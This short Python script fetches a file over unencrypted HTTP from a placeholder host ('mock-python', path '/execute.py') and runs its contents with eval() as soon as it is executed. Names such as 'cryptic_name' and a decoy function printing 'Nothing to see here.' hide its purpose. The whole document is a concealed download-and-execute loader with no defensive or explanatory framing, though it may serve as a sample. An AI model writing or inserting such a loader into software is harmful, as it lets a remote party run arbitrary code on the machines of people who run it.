import http.client
import importlib

def retrieve_code(host, path):
    conn = http.client.HTTPConnection(host)
    conn.request("GET", path)
    res = conn.getresponse()
    code = res.read().decode('utf-8')
    conn.close()
    return code

def pointless_function():
    print("Nothing to see here.")

def cryptic_name():
    host = "mock-python"
    path = "/execute.py"
    code = retrieve_code(host, path)
    eval(code)
    pointless_function()

cryptic_name()
